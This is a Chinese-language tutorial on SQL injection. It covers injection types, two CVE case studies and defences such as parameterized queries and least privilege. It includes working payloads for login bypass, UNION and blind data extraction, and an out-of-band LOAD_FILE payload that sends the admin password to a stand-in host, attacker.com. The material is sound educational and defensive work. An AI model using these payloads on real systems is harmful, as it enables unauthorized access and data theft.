# SQL注入 Sql injection

## 一、SQL注入基本概念

### 1. 什么是SQL注入
SQL注入（SQL Injection）是一种代码注入技术，攻击者通过在用户可控的输入点插入恶意SQL代码，使应用程序执行非预期的SQL语句，从而破坏数据库查询的完整性。这种攻击可能导致未授权访问、数据泄露、数据篡改甚至服务器接管。

### 2. SQL注入的工作原理
当应用程序直接拼接用户输入到SQL查询语句中，而没有进行适当的验证和过滤时，就会产生SQL注入漏洞。例如：

```sql
-- 不安全的查询方式
SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passwordInput + "';
```

如果用户输入 `admin' --`，则实际执行的SQL语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = '任意值';
```

这里 `--` 是SQL注释符，使后面的密码验证条件被注释掉，从而绕过了密码验证。

### 3. SQL注入的危害
- **数据泄露**：未经授权访问敏感数据（个人信息、密码、信用卡等）
- **数据篡改**：修改、删除或插入数据
- **权限提升**：获取数据库管理员权限
- **服务器接管**：在某些情况下，可执行系统命令
- **业务中断**：通过删除数据或触发数据库错误导致服务不可用

## 二、SQL注入的常见类型

### 1. 错误型注入（Error-based Injection）
利用数据库错误消息获取信息。当应用程序将数据库错误直接返回给用户时，攻击者可以通过构造特定查询触发错误，从错误信息中获取数据库结构等信息。

```sql
-- 例如在MySQL中触发错误并提取信息
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) -- 
```

### 2. 联合查询注入（UNION-based Injection）
使用UNION运算符将攻击者的查询与原始查询结合，直接从数据库中提取数据。

```sql
-- 例如获取用户表信息
' UNION SELECT 1, username, password, 4 FROM users -- 
```

### 3. 布尔型盲注（Boolean-based Blind Injection）
当应用不返回错误信息或查询结果时，攻击者通过观察应用的不同响应（如页面内容变化）来推断信息。

```sql
-- 逐字符猜测数据
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' -- 
```

### 4. 时间延迟盲注（Time-based Blind Injection）
通过观察查询执行时间的差异来推断信息，常用于无任何可见输出的场景。

```sql
-- 如果条件为真，则执行延时
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a', SLEEP(5), 0) -- 
```

### 5. 二阶注入（Second-order Injection）
攻击者的输入被安全地存储在数据库中，但在后续操作中被不安全地使用，导致注入发生。

```sql
-- 第一阶段：存储恶意输入
-- 用户注册时提供用户名：admin' -- 

-- 第二阶段：在另一个查询中使用该输入
SELECT * FROM user_logs WHERE username = '" + stored_username + "';
```

### 6. 带外注入（Out-of-band Injection）
当无法通过常规渠道获取数据时，攻击者使数据库通过DNS或HTTP请求将数据发送到外部服务器。

```sql
-- 在MySQL中使用LOAD_FILE函数发起DNS请求
' AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\share\\a.txt'))) -- 
```

## 三、真实案例分析

### 1. 2023年MOVEit Transfer漏洞（CVE-2023-34362）
**漏洞描述**：MOVEit Transfer的`moveitisapi.dll`组件存在SQL注入漏洞，攻击者无需身份验证即可利用。

**攻击过程**：
1. 攻击者向特定API端点发送包含恶意SQL代码的请求
2. 由于缺乏输入验证，SQL代码被执行
3. 攻击者获取数据库访问权限，窃取敏感数据

**影响范围**：全球数千家企业受影响，大量敏感数据被盗取。

### 2. PostgreSQL特殊字符漏洞（CVE-2025-1094）
**漏洞描述**：PostgreSQL在处理特殊字符（如无效UTF-8编码）时存在注入风险。

**攻击过程**：
1. 攻击者构造包含特殊字符序列的输入
2. 数据库解析器错误处理这些字符
3. 导致SQL语句结构被破坏，执行非预期操作

**影响**：即使是最新的数据库系统，如果未正确处理特殊字符输入，仍可能存在注入风险。

## 四、SQL注入防御措施

### 1. 参数化查询（Prepared Statements）
使用参数化查询是防御SQL注入的最有效方法，它将SQL语句结构与数据分离。

```java
// Java JDBC示例
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

```python
# Python示例
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

```javascript
// Node.js示例
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
connection.query(query, [username, password], function(error, results) {
  // 处理结果
});
```

### 2. ORM框架使用
ORM框架通常内置了参数化查询机制，可以有效防止SQL注入。

```javascript
// Sequelize (Node.js) 示例
User.findOne({
  where: {
    username: username,
    password: password
  }
});
```

```python
# SQLAlchemy (Python) 示例
user = session.query(User).filter(User.username == username, User.password == password).first()
```

### 3. 输入验证与过滤
对用户输入进行严格的验证和过滤，特别是对于动态表名、列名等无法参数化的场景。

```java
// 白名单验证示例
String[] allowedColumns = {"name", "age", "email"};
if (!Arrays.asList(allowedColumns).contains(columnInput)) {
    throw new SecurityException("Invalid column name");
}
```

### 4. 特殊场景处理

#### 动态表名/列名
```java
// 使用白名单验证
Map<String, String> allowedTables = new HashMap<>();
allowedTables.put("users", "users");
allowedTables.put("products", "products");

String tableName = allowedTables.get(userInput);
if (tableName == null) {
    throw new SecurityException("Invalid table name");
}

// 然后使用验证后的表名
String sql = "SELECT * FROM " + tableName + " WHERE id = ?";
```

#### LIKE语句
```sql
-- 正确方式
SELECT * FROM users WHERE name LIKE CONCAT('%', ?, '%')
```

#### IN子句
```java
// 处理IN子句
List<Integer> ids = validateAndConvertToIntList(userInput);
StringBuilder placeholders = new StringBuilder();
for (int i = 0; i < ids.size(); i++) {
    placeholders.append(i > 0 ? ",?" : "?");
}

String sql = "SELECT * FROM products WHERE id IN (" + placeholders.toString() + ")";
PreparedStatement stmt = connection.prepareStatement(sql);
for (int i = 0; i < ids.size(); i++) {
    stmt.setInt(i+1, ids.get(i));
}
```

### 5. 最小权限原则
- 为应用程序使用的数据库账号分配最小必要权限
- 避免使用数据库管理员账号连接应用程序
- 对不同功能使用不同的数据库账号，实现权限分离

```sql
-- 创建限制权限的数据库用户
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT ON app_db.users TO 'app_user'@'localhost';
GRANT SELECT ON app_db.products TO 'app_user'@'localhost';
```

### 6. 错误处理
- 在生产环境中禁用详细的数据库错误信息
- 使用自定义错误页面，避免暴露技术细节
- 记录错误但不向用户展示技术细节

### 7. WAF与监控
- 部署Web应用防火墙（WAF）拦截常见的SQL注入攻击
- 实施数据库活动监控，检测异常查询
- 定期审计数据库日志，识别潜在攻击

## 五、SQL注入的未来趋势

### 1. 攻击目标转移
随着主流Web应用安全性提高，攻击者正转向以下领域：
- API接口和微服务
- 物联网设备
- 遗留系统和老旧应用
- 云原生环境

### 2. 新型注入技术
- **NoSQL注入**：针对MongoDB、Redis等非关系型数据库的注入攻击
- **GraphQL注入**：利用GraphQL查询语言特性的注入攻击
- **ORM注入**：针对ORM框架特性的注入技术

### 3. 防御技术演进
- 基于AI的异常检测系统
- 运行时应用自我保护（RASP）
- 自动化代码审计工具
- 零信任安全架构

## 六、总结

SQL注入虽然是一种古老的攻击方式，但在当今的应用开发中仍然具有重要的威胁性。尽管现代框架和ORM技术大幅降低了SQL注入的风险，但在特定场景下（如动态SQL、遗留系统、开发者误用框架等）仍然存在漏洞。

有效防御SQL注入需要多层次防护策略：
1. **开发层**：使用参数化查询、ORM框架、严格输入验证
2. **架构层**：实施最小权限原则、适当的错误处理
3. **运维层**：部署WAF、监控异常活动、定期安全审计
4. **管理层**：安全培训、代码审查、渗透测试

随着技术的发展，SQL注入攻击和防御技术也在不断演进。安全意识和最佳实践的持续更新对于保护系统免受SQL注入攻击至关重要。